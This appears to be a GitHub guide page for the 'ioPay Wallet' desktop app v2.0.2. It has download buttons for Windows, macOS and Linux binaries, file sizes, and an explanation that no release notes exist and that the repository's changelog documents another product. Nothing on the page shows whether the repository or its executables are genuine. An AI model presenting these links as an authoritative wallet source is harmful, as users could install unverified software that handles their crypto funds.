![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# ioPay Wallet Versions and Release Notes

**The current desktop release is v2.0.2, published 19 November 2026** (F003). If you want one line from this page, that is it.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

The rest of the page exists because "release notes" implies a document that does not exist, and the absence is worth explaining rather than papering over.

## What version am I on?

Open the app's about or version area. The string should read **v2.0.2**. Anything earlier is an old build, and updating is the first fix to try for odd behaviour.

You can also tell versions apart from the file names: every release asset carries its version, so `iopay-wallet-desktop-win-v2.0.2.exe` is unambiguous about what it is (F004).

## The three assets of v2.0.2

| Platform | File | Size |
|---|---|---|
| Windows | `.exe` | 63.8 MB |
| macOS | `.dmg` | 21.5 MB |
| Linux | `.zip` | 79.4 MB |

No other formats are published - no `.msi`, `.pkg`, `.deb`, `.rpm`, AppImage or store package.

## Why there are no release notes

Two documents that look like they should answer "what changed" both fail:

- **The release body** repeats the title only (F006). There is no summary, no list of fixes, no migration note.
- **`CHANGELOG.md`** is generated from an upstream codebase and documents a different product's history (F007, F038). Anything you read there is not ioPay's history.

So this page cannot tell you what changed in v2.0.2, and it will not invent a list. If a third-party site offers "v2.0.2 changelog", it is either paraphrasing the title or guessing.

## What that means in practice

**For updating:** you do not need notes. Your accounts, phrase and positions are not part of the installer, so updating is safe; the app also supports auto-update. [Update guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/updating-iopay-wallet-to-the-latest-version.md).

**For deciding whether to update:** the honest position is that the current release is the one to run. There is no published risk assessment to weigh against it.

**For judging claims about features:** verify them in the app, not in a document. That is not a satisfying answer, but it is the accurate one.

## Telling this build from others

If you are unsure what you have installed - or whether you are on the earlier-generation desktop client - the asset names, the repository and the backup model are the three checks. [Which build is current](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-and-earlier-desktop-builds.md) walks through them.

## FAQ

**Which version of ioPay Wallet is current?**
v2.0.2, published 19 November 2026.

**Where are the release notes?**
Not published. The release body carries the title only, and the repository's changelog belongs to another codebase.

**What changed in v2.0.2?**
This page cannot say, because no source documents it. The repository's history is the only record, and reading a diff is not a changelog.

**Is the changelog on GitHub accurate?**
No - it documents a different product's history (F007).

**How do I know I have the current build?**
Check the version in the app, or the version embedded in the asset name you downloaded.

## Reading the release page without release notes

An empty release body still answers three questions, and it is worth knowing which parts of the page carry the answer.

**The tag** is the version - `v2.0.2` - and it is the only version claim the project itself makes. **The date** is 19 November 2026, which tells you whether the page you are reading is older than the build it describes. **The assets list** is three files, one per platform, each carrying the version inside its name (F004).

What it does not give you is a summary, a fixed-bug list or a migration note, because the body repeats the title and stops (F006). If you need to know whether a specific problem was addressed, the only available evidence is the app's behaviour on the current build - a test, not a document.

## Four places version claims come from

| Source | What it is | Trust it for |
|---|---|---|
| The release tag and asset names | the project's own artifacts | which version exists, and which file is which |
| The app's own version display, where the build shows one | the build on your machine | your version, not the latest one |
| `CHANGELOG.md` in the repository | generated from another codebase (F007) | nothing about ioPay |
| Third-party review sites | commentary, often months behind (F048) | background, never a version number |

That table settles most "which version is current" arguments, because only two rows are authoritative and one of them describes your installation rather than the project.

## What a version number can and cannot tell you

It identifies an artifact, and that is all. It does not say what changed, whether a bug you hit was fixed, or whether anything you rely on moved. Three practical consequences follow.

**Updating is a test, not a decision.** Since there are no notes to weigh, the question "should I update" has one useful answer: install the current build and see whether the behaviour you cared about is still there. Your accounts are not in the installer, so the test costs you a download.

**Older builds are not a fallback.** There is no published risk assessment for v2.0.2 and no published archive of previous releases either; pinning an old version to avoid a change is not a supported position, and the version you would pin is not documented anywhere on the project's pages.

**A feature claim needs the app.** Anything you read about what this build does - including on this project's pages - is a description of behaviour, and the version screen tells you which behaviour you are looking at.


## Write down what you installed

Because nothing published records a changeset, the only history you will have is the one you keep. Note the file name, its size, the date you installed it and the version the app reports. Three lines in a text file are enough.

That record answers questions the release page cannot: whether the build on this machine is the one you downloaded last month, whether two machines are on the same version, and when a behaviour you rely on changed. Keep it beside the backup notes rather than inside the app, since the app is the thing being upgraded.

Record the asset name as well as the version. It carries the platform and the version in one string (F004), so a line reading `-macos-v2.0.2.dmg`, 21.5 MB, installed on 20 November answers both what you installed and where it came from, months after the download has been deleted.

---

*Version, assets and release-body behaviour follow F003/F004/F006; changelog caveat from F007/F038.*
